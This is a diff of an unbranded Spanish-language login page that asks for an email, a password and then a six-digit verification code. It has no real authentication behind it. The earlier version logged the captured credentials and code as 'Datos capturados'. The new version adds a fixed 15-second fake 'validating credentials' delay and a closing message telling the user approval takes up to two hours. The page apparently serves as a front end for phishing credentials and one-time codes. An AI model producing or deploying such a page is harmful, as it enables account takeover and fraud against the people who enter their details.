@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iniciar Sesión</title>
+    <title>Verificación de dos pasos</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f0f4f8;
+            background-color: #e0f2fe; /* Azul cielo claro */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -15,66 +15,54 @@
             margin: 0;
         }
         .container {
-            background-color: #ffffff;
+            background-color: #ffffff; /* Blanco */
             padding: 35px 25px;
             border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0, 40, 100, 0.08);
+            box-shadow: 0 4px 20px rgba(0, 149, 255, 0.1);
             width: 100%;
             max-width: 360px;
             box-sizing: border-box;
-            border-top: 5px solid #0056b3;
+            border-top: 5px solid #38bdf8; /* Azul cielo intenso */
+            text-align: center;
         }
         h2 {
             margin-top: 0;
-            color: #003366;
-            text-align: center;
+            color: #0369a1; /* Azul oscuro suave */
             font-size: 22px;
             margin-bottom: 25px;
         }
         .input-group {
             position: relative;
             margin-bottom: 20px;
+            text-align: left;
         }
         label {
             display: block;
             margin-bottom: 6px;
-            color: #4a5568;
+            color: #0369a1;
             font-size: 14px;
             font-weight: 500;
         }
         input {
             width: 100%;
             padding: 12px;
-            border: 1px solid #cbd5e1;
+            border: 1px solid #bae6fd;
             border-radius: 6px;
             box-sizing: border-box;
             font-size: 16px;
-            background-color: #f8fafc;
-            color: #334155;
+            background-color: #f0f9ff;
+            color: #1e293b;
             transition: border-color 0.2s;
         }
         input:focus {
             outline: none;
-            border-color: #0056b3;
+            border-color: #38bdf8;
             background-color: #ffffff;
-        }
-        .password-wrapper {
-            position: relative;
-            display: flex;
-            align-items: center;
-        }
-        .toggle-password {
-            position: absolute;
-            right: 12px;
-            cursor: pointer;
-            color: #64748b;
-            font-size: 18px;
-            user-select: none;
         }
         button {
             width: 100%;
             padding: 14px;
-            background-color: #0056b3;
+            background-color: #38bdf8; /* Azul cielo */
             color: white;
             border: none;
             border-radius: 6px;
@@ -85,11 +73,7 @@
             margin-top: 10px;
         }
         button:hover {
-            background-color: #004085;
-        }
-        button:disabled {
-            background-color: #94a3b8;
-            cursor: not-allowed;
+            background-color: #0ea5e9;
         }
         .step {
             display: none;
@@ -100,19 +84,58 @@
         .instruction-text {
             color: #64748b;
             font-size: 14px;
-            text-align: center;
             line-height: 1.5;
             margin-bottom: 20px;
         }
-        .timer {
-            text-align: center;
-            font-size: 18px;
-            font-weight: bold;
-            color: #dc2626;
-            margin-top: 15px;
-            background-color: #fee2e2;
-            padding: 8px;
-            border-radius: 6px;
+
+        /* --- ANIMACIONES --- */
+        
+        /* Spinner de carga animado */
+        .spinner {
+            border: 4px solid #f0f9ff;
+            border-top: 4px solid #38bdf8;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Reloj animado */
+        .clock-container {
+            position: relative;
+            width: 60px;
+            height: 60px;
+            border: 4px solid #38bdf8;
+            border-radius: 50%;
+            margin: 20px auto;
+            background-color: #ffffff;
+        }
+        .clock-hand {
+            position: absolute;
+            width: 4px;
+            background-color: #0369a1;
+            border-radius: 2px;
+            transform-origin: bottom center;
+            left: calc(50% - 2px);
+        }
+        .hour-hand {
+            height: 14px;
+            top: 16px;
+            animation: rotateHand 12s linear infinite;
+        }
+        .minute-hand {
+            height: 20px;
+            top: 10px;
+            animation: rotateHand 1s linear infinite;
+        }
+        @keyframes rotateHand {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -121,112 +144,81 @@
 <div class="container">
     <!-- PASO 1: LOGIN -->
     <div id="step1" class="step active">
-        <h2>Ingreso al Sistema</h2>
+        <h2>Verificación de dos pasos</h2>
         <form id="loginForm">
             <div class="input-group">
-                <label for="usuario">Usuario</label>
-                <input type="text" id="usuario" required placeholder="Ej. correo o identificación">
+                <label for="usuario">Correo electrónico</label>
+                <input type="text" id="usuario" required placeholder="Introduce tu correo">
             </div>
             
             <div class="input-group">
                 <label for="contrasena">Contraseña</label>
-                <div class="password-wrapper">
-                    <input type="password" id="contrasena" required placeholder="Introduce tu clave">
-                    <span class="toggle-password" id="eyeIcon">👁️‍🗨️</span>
-                </div>
+                <input type="password" id="contrasena" required placeholder="Introduce tu clave">
             </div>
             
             <button type="submit" id="btnSiguiente">Siguiente</button>
         </form>
     </div>
 
-    <!-- PASO 2: CÓDIGO DE VERIFICACIÓN -->
+    <!-- PASO DE CARGA (15 SEGUNDOS) -->
+    <div id="stepLoading" class="step">
+        <h2>Procesando solicitud</h2>
+        <p class="instruction-text">Por favor, espera un momento mientras validamos tus credenciales de seguridad...</p>
+        <div class="spinner"></div>
+    </div>
+
+    <!-- PASO 2: CÓDIGO DE VERIFICACIÓN (SOLO NÚMEROS) -->
     <div id="step2" class="step">
-        <h2>Verificación de Seguridad</h2>
-        <p class="instruction-text">Por favor, pon el código de 6 dígitos que hemos enviado a tu correo o número de celular para continuar.</p>
+        <h2>Código de Seguridad</h2>
+        <p class="instruction-text">Introduce el código numérico enviado para continuar.</p>
         
         <form id="codeForm">
             <div class="input-group">
-                <input type="text" id="codigoVerificacion" maxlength="6" pattern="\d{6}" required placeholder="000000" style="text-align: center; font-size: 24px; letter-spacing: 8px;">
+                <!-- inputmode="numeric" y pattern="\d*" obligan al celular a abrir el teclado numérico -->
+                <input type="text" id="codigoVerificacion" inputmode="numeric" pattern="\d*" maxlength="6" required placeholder="000000" style="text-align: center; font-size: 24px; letter-spacing: 8px;">
             </div>
             
-            <button type="submit" id="btnFinalizar">Verificar</button>
+            <button type="submit" id="btnFinalizar">Verificar Código</button>
         </form>
-        
-        <div class="timer" id="countdown">10:00</div>
+    </div>
+
+    <!-- PASO FIN: MENSAJE EXITO + RELOJ ANIMADO -->
+    <div id="stepFinal" class="step">
+        <h2>Solicitud Recibida</h2>
+        <div class="clock-container">
+            <div class="clock-hand hour-hand"></div>
+            <div class="clock-hand minute-hand"></div>
+        </div>
+        <p class="instruction-text" style="font-weight: 500; color: #0369a1; margin-top: 20px;">
+            Ya has solicitado la verificación de dos pasos, la aprobación dura de 10 minutos a 2 horas.
+        </p>
     </div>
 </div>
 
 <script>
-    const contrasenaInput = document.getElementById('contrasena');
-    const eyeIcon = document.getElementById('eyeIcon');
-
-    eyeIcon.addEventListener('click', function() {
-        if (contrasenaInput.type === 'password') {
-            contrasenaInput.type = 'text';
-            eyeIcon.textContent = '👁️'; 
-        } else {
-            contrasenaInput.type = 'password';
-            eyeIcon.textContent = '👁️‍🗨️'; 
-        }
-    });
-
-    // Envío del Paso 1 (Usuario y Clave)
+    // Manejo del Envío del Paso 1 (Login)
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
-        const usuario = document.getElementById('usuario').value;
-        const contrasena = document.getElementById('contrasena').value;
-        const btn = document.getElementById('btnSiguiente');
+        // Cambiar inmediatamente a la pantalla de carga animada
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('stepLoading').classList.add('active');
 
-        btn.disabled = true;
-        btn.innerText = 'Cargando...';
-
-        // Procesamiento local estable para cambiar de pantalla inmediatamente
+        // Esperar exactamente 15 segundos (15000 milisegundos)
         setTimeout(() => {
-            console.log("Datos capturados:", usuario, contrasena);
-            document.getElementById('step1').classList.remove('active');
+            document.getElementById('stepLoading').classList.remove('active');
             document.getElementById('step2').classList.add('active');
-            startTimer(600);
-        }, 800);
+        }, 15000);
     });
 
-    // Envío del Paso 2 (Código de Verificación)
+    // Manejo del Envío del Paso 2 (Código Numérico)
     document.getElementById('codeForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        const codigo = document.getElementById('codigoVerificacion').value;
-        const btn = document.getElementById('btnFinalizar');
-
-        btn.disabled = true;
-        btn.innerText = 'Procesando...';
-
-        setTimeout(() => {
-            console.log("Código capturado:", codigo);
-            alert('Verificación completada con éxito.');
-            btn.disabled = false;
-            btn.innerText = 'Verificar';
-        }, 1000);
-    });
-
-    function startTimer(duration) {
-        let timer = duration, minutes, seconds;
-        const display = document.getElementById('countdown');
         
-        const interval = setInterval(function () {
-            minutes = parseInt(timer / 60, 10);
-            seconds = parseInt(timer % 60, 10);
-
-            minutes = minutes < 10 ? "0" + minutes : minutes;
-            seconds = seconds < 10 ? "0" + seconds : seconds;
-
-            display.textContent = minutes + ":" + seconds;
-
-            if (--timer < 0) {
-                clearInterval(interval);
-                display.textContent = "Expirado";
-            }
-        }, 1000);
-    }
+        // Cambiar directamente a la pantalla final con el reloj animado
+        document.getElementById('step2').classList.remove('active');
+        document.getElementById('stepFinal').classList.add('active');
+    });
 </script>
 
 </body>
